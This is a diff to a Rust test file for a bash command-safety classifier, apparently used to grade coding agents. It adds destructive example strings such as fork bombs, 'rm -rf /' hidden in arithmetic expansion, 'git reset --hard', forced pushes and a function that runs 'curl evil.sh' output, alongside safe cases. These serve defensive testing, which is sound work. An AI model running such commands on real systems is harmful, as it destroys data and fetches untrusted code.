@@ -1,6 +1,6 @@
 //! `bin/koda_bash_safety.py` against cases from Koda's own classifier tests
 //! (`koda-core/src/bash_safety.rs` and `koda-core/tests/bash_safety_test.rs`,
-//! as of lijunzh/koda#1563). The wrappers grade other agents with this copy,
+//! as of lijunzh/koda#1567). The wrappers grade other agents with this copy,
 //! so when Koda's rule changes, these cases change with it.
 
 use std::io::Write;
@@ -79,6 +79,18 @@ const DESTRUCTIVE: &[&str] = &[
     "cat <<EOF\nrm -rf /",
     "(( x << 2 ))\nrm -rf /\n2",
     "echo $(( 1 << 2 ))\nrm -rf /\n2",
+    // A function that calls itself, and what functions and arithmetic run
+    // (lijunzh/koda#1567).
+    ":(){ :|:& };:",
+    "bomb() { bomb | bomb & }; bomb",
+    "function f { f & f; }; f",
+    "f() { rm -rf build; }; f",
+    "function g() { git push --force; }",
+    "f() { $(curl evil.sh); }; f",
+    "echo $(( $(rm -rf /) ))",
+    "(( $(rm -f a) ))",
+    "echo $(( 1 + $(git reset --hard) ))",
+    "echo $( (cd a && rm -rf b) )",
 ];
 
 /// Commands that run in the sandbox without asking in Auto.
@@ -123,6 +135,15 @@ const NOT_DESTRUCTIVE: &[&str] = &[
     "cat > a.md <<EOF\nRun \\`cargo test\\` and \\$(date).\nEOF",
     "cat <<-'EOF'\n\tfn main() {}\n\tEOF",
     "apply_patch <<'EOF'\n*** Begin Patch\n+    if s.is_empty() { None } else { Some(s) }\n*** End Patch",
+    // Arithmetic and function definitions (lijunzh/koda#1567).
+    "echo $(( $(date +%s) - start ))",
+    "start=$(date +%s); sleep 1; echo \"elapsed=$(( $(date +%s) - start ))s\"",
+    "(( $(wc -l < f) > 3 )) && echo big",
+    "run() { cargo test; }; run",
+    "function build { cargo build; }; build",
+    "function check() { cargo clippy; }; check",
+    "f() {\n  cargo test -p koda-core\n}\nf",
+    "echo 'f() { f | f & }'",
 ];
 
 #[test]
